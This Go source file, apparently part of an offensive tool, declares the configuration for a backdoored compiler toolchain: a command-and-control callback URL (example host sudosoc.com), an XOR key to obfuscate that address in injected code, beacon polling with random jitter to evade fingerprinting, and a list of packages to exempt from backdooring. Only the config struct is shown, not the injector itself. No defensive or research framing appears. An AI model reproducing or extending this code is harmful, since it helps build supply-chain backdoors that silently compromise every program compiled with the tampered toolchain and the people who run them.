package patcher

// BackdoorConfig holds the operator-configured C2 parameters that are
// baked into the modified compiler at install time.
// These values are embedded by install.go, then passed through to the
// injector (init_injector.go) which is compiled into the toolchain.
var BackdoorConfig = struct {
	// C2Addr is the full C2 callback URL (e.g. "https://sudosoc.com/b").
	C2Addr string
	// BeaconKey is used to XOR-obfuscate the C2 address in the injected IR.
	BeaconKey string
	// PollMS is the beacon polling interval in milliseconds.
	PollMS int
	// JitterMS is added randomly to PollMS (anti-fingerprint).
	JitterMS int
	// SkipTags are package path substrings that should NOT be backdoored.
	SkipTags []string
}{}
